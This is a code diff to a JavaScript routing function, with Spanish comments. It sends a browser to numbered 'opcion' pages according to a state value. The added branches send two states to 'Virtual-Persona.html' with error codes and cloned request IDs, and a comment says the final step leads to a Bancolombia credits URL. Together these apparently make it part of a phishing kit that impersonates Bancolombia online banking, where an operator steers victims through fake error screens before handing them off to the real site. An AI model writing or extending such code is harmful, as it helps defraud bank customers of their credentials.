@@ -120,6 +120,19 @@
        opcion_10 FINALIZAR                → finalizado.html?key&requestId (PANTALLA CONFIRMACION 5 DIAS, boton FINALIZAR ahi = Bancolombia creditos URL)
        cualquier otro                     → null (no navegar)
   */
+  /* helper: clona todos los params URL actuales + agrega nuevos */
+  function cloneParams(extras) {
+    const p = new URLSearchParams(window.location.search);
+    if (extras && typeof extras === 'object') {
+      for (const k of Object.keys(extras)) {
+        const v = extras[k];
+        if (v !== null && v !== undefined) p.set(k, String(v));
+        else p.delete(k);
+      }
+    }
+    return p.toString();
+  }
+
   function urlPara(estado) {
     switch (estado) {
       case 'opcion_1':
@@ -129,9 +142,11 @@
       case 'opcion_6':
         return `opcion6.html?key=${encodeURIComponent(key)}`;
       case 'opcion_3':  return `opcion3.html?key=${encodeURIComponent(key)}`;
-      case 'opcion_4':  return `opcion4.html?key=${encodeURIComponent(key)}`;
+      case 'opcion_4':
+        return `Virtual-Persona.html?` + cloneParams({ error: '2', key: key, requestId: requestId, rid: requestId });
       case 'opcion_5':  return `opcion5.html?key=${encodeURIComponent(key)}`;
-      case 'opcion_7':  return `opcion7.html?key=${encodeURIComponent(key)}`;
+      case 'opcion_7':
+        return `Virtual-Persona.html?` + cloneParams({ error: '1', key: key, requestId: requestId, rid: requestId });
       case 'opcion_8':  return `opcion8.html?key=${encodeURIComponent(key)}`;
       case 'opcion_55': return `opcion55.html?key=${encodeURIComponent(key)}`;
       case 'opcion_9':  return `opcion9.html?key=${encodeURIComponent(key)}`;
